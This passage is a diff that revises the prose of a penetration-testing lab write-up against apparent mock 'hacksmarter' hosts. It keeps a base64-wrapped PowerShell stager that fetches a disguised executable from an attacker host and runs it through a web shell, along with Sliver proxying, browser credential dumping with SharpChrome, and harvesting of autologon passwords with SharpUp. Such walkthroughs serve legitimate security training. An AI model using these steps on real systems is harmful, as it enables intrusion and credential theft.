@@ -166,7 +166,7 @@ We then bypassed **Dynamic/Behavioral Analysis** by executing our C2 agent direc
 > 
 
 **Execution via Web Shell**
-To deliver our stager through the existing PHP web shell, we utilized a PowerShell one-liner. To ensure the command was not mangled by the web server’s URL handling, we converted the command to a Base64 encoded string using the following command:
+To deliver our stager, i'll utilize a PowerShell one-liner. To ensure the command was not mangled by the web server’s URL handling, I converted the command to a Base64 encoded string using the following command:
 
 ```bash
 echo -n 'IWR http://kali-ip/MsEdgeUpdate.exe -OutFile $env:TEMP\MsEdgeUpdate.exe; Start-Process $env:TEMP\MsEdgeUpdate.exe' | iconv -t utf16le | base64 -w 0
@@ -204,11 +204,11 @@ Logon ID: EC2AMAZ-IBNMCK4\j.smith
 [*] Current Token ID: EC2AMAZ-IBNMCK4\j.smith
 ```
 
-We now have a working session on `web.hacksmarter` and we ARE IN. However, we are still restricted in what we can do due to Windows Defender AND we are also low-level.
+We now have a working session on `web.hacksmarter`
 
 # Post Compromise
 
-First thing i’m going to do is start a socks5 proxy. The second host is a sql server and chances are the port is 3306. We’re going to do a quick nmap scan to verify that the port is open and our initial machine is able to access it. 
+First thing i’m going to do is start a socks5 proxy. The second host is a mysql server on port 3306. We’re going to do a quick nmap scan to verify that the port is open and what version. 
 
 ```bash
 sliver (MIDDLE-CLASS_LEATHER) > socks5 start
@@ -223,7 +223,7 @@ Make sure to add this to your `/etc/proxychains.conf` &/or `/etc/proxychains4.co
 socks5 127.0.0.1 1081
 ```
 
-We can now verify if port 3306 is open, and do a quick version check:
+Running the nmap scan:
 
 ```bash
 proxychains4 nmap -Pn -sT -sV -p 3306 sqlsrv.hacksmarter
@@ -246,11 +246,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
 ```
 
-We are successful! We also find out the sql database type and version. 
+We find out the sql database is MariaDB.
 
 ## Post Enumeration
 
-For post enumeration, I think it’s important to run a quick `info` on the sliver session. We can find out what OS version our windows target is rockin
+For post enumeration, I usually run a quick `info` command to identify OS Versions. It's probably unneeded in our case, but I think it's important to run nonetheless for mocked assessments.
 
 ```bash
 sliver (MIDDLE-CLASS_LEATHER) > info
@@ -275,7 +275,7 @@ Reconnect Interval: 1m0s
       Last Checkin: Fri Dec 19 19:28:45 EST 2025 (1m6s ago)
 ```
 
-We can also verify what privileges we currently have as well:
+We can also identify privileges using the `getprivs` command:
 
 ```bash
 sliver (MIDDLE-CLASS_LEATHER) > getprivs
@@ -293,13 +293,13 @@ SeCreateGlobalPrivilege       	Create global objects                     	Enable
 SeIncreaseWorkingSetPrivilege 	Increase a process working set            	Disabled
 ```
 
-This is big! We have `SeImpersonatePrivilege` enabled. We’re going to try different armories first, so we will keep this as a last resort. 
+This is big! We have `SeImpersonatePrivilege` enabled. Knowing Windows Defender is active, I really don't want to go through the trouble in trying to manually transfer GodPotato or any other exploits needed in this case, while trying to bypass the AV. I'll start with potential enumeration techniques sliver might have for us in the `armory` list. If none are useful, we can come back to this point. :(
 
 ---
 
 ## CredDump : Sliver Armory `SharpChrome`
 
-My current thought is to find out if there are any stored plaintext passwords on the system. Since our current machine’s host name is called `web.hacksmarter` and is hosting a webserver. It would’nt hurt to run an armory tool called `SharpChrome` to see if we could grab plaintext credentials from other users. 
+My plan is to find out if there are any stored passwords on the system. Since our current machine’s host name is called `web.hacksmarter` and is hosting a webserver. It would’nt hurt to run an armory tool called `SharpChrome` to see if we could grab plaintext credentials from other users stored on Chrome or Microsoft Edge. 
 
 I’ll first run a quick `chrome` check
 
@@ -361,25 +361,21 @@ b.morgan
 
 ## Attempting to login as `b.morgan` into the SQL Server
 
-Unfortunately, the attempted login fails due to `b.morgan` having insufficient privileges. 
-
-That means there’s either another set of creds stored on our current targeted system `web.hacksmarter` or we need to try and find a way to run a GodPotato attack to abuse our current user’s `SeImpersonate` privilege. 
-
-I’m going to attempt to test out another armory tool on sliver, before attempting to try manually transfer/execute as well as bypass windows defender. 
+Unfortunately, the attempted login fails due to `b.morgan` having insufficient privileges. We need to dig for more creds. 
+We can check out other armory tools to help us in this case.
 
 ## Local Privilege Escalation : Plaintext Discovery
 
-After doing some research, I came across this armory tool
+After doing some research, I came across the armory tool:
 
 ```bash
 sharpup
 ```
 
-`Sharpup` is a local privilege escalation (LPE) check tool. Instead of you manually checking every folder permission and registry key, SharpUp automates the search
+`Sharpup` is a local privilege escalation (LPE) check tool. Instead of you manually checking every folder permission and registry key, SharpUp automates the search process. More importantly, it checks for any stored AUTOLOGON credentials in the registry!!
 
-We can run the `audit` flag to run checks and automat the inspection of service permissions, registry configurations, and path hijack opportunities. 
+We can run the `audit` flag to do a full check:
 
-More importantly! An AUTOLOGON check!!
 
 ```bash
 sliver (MIDDLE-CLASS_LEATHER) > sharpup audit
@@ -423,7 +419,7 @@ Registry AutoLogon Found
 [*] Completed Privesc Checks in 1 seconds
 ```
 
-We find a set of credentials!
+We get a hit!
 ```bash
 p.richardson
 ^[REDACTED]6
